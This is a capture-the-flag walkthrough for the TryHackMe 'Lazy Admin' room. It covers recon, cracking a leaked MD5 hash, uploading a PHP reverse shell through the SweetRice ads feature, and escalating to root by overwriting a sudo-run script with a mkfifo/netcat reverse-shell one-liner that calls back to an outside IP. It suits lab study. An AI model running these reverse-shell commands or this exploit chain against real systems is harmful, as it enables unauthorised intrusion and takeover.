# Lazy Admin

Easy box from THM. 
Room can be found here https://tryhackme.com/room/lazyadmin#

`export IP=10.10.160.133`


## Overview

Tags:
- **SweetRice**
- **sudo-l**
- **Security Misconfig**
- **ALWAYS CHECK SUID!!!!**

## user.txt

Starting with nmap:
```sh
nmap -sC -sV -oA nmap/ $IP
```
Found the following ports open:
- 22 --> SSH
- 80 --> HTTP

The website is nothing but the default Apache2 page


Then we run Gobuster:
```sh
gobuster -dir  $IP
```
Found following subdomain:
`/content`

This page tells us that something called `SweetRice` is running on the server

We then do a new gobuster for the /content subdomain and find a bunch more:
```sh
/images     [--> http://10.10.210.85/content/images/]
/js         [--> http://10.10.210.85/content/js/]    
/inc        [--> http://10.10.210.85/content/inc/]   
/as         [--> http://10.10.210.85/content/as/]    
/_themes    [--> http://10.10.210.85/content/_themes/]
/attachment [--> http://10.10.210.85/content attachment/]
```

Exploring these we found a sql database backup in the `/inc` subdomain, we save it and dig around in it and find a potential hash:
`42f749ade7f9e195bf475f37a44cafcb`

This is an outdated md5 hash for `Password123`
The username is `manager` and not *admin*

Googling SweetRice, there where multiple vulnerabilities using the /as subdomain. We explore it and are prompted with a loginpage on `$IP/content/as`
We can use our credentials to log into the admin panel. 


On the admin panel we can add "ADS" on the /content/inc/ads folder, and we can upload php code that will execute (based on a PoC from ExploitDB, Link is here: https://www.exploit-db.com/exploits/40700)

We then upload pentestmonkeys reverseShell script to a ADS that we name `dontclick.php` and set up a netcat listener on our machine. Once we go to the http://10.10.158.205/content/inc/ads/dontclick.php it will execute the php code, and we catch the shell with netcat on out machine. 

We now have a rev shell and can look for user.txt

To get a more stable shell we use the following python magic:
```python
python -c 'import pty; pty.spawn("/bin/bash")'
```

Then type `ctrl + Z`
Then type `stty raw -echo`
Then type `fg`
Then type `export TERM=xterm256-color`

We now have atb autocomplete and a more stable shell that does not crash that often.










## root.txt 

We see a mysql_login.txt on the `itguy` user `home` folder. It contains the following credentials: `rice:randompass`. It might come in handy later.

Using `sudo -l` we see that www-data can run the following script as root: `backup.pl`. So we start by analyzing it. 



Here is the script:

```perl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```

This script uses the `system()` function in **perl** to run all systemcommands in the `/etc/copy.sh` bashscript.
If we `cat` the `copy.sh` script, we see it contains the following:

```sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
```

That is a reverse shell.. And we have the ability to write to this copy.sh script. That means we can change the IP and port to trace back to us. 

The solution is a bit tricky since we cant nano the script for some reason. 
I ended up just overwriting the whole script with another rev shell using the `>` delimeter which overwrites:
```sh 
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.33.116 9002 >/tmp/f" > /etc/copy.sh
```

Now we set up a listener on my machine for port 9002 with the following command:
```sh
nc -lnvp 9002
```

Finally we can run the script, but we have to use the full path, as stated with the `sudo -l` command:
```sh
User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

So we run backup.pl on the victim machine:
```sh
sudo /usr/bin/perl /home/itguy/backup.pl
```

We catch the shell on out own machine, and we are root!
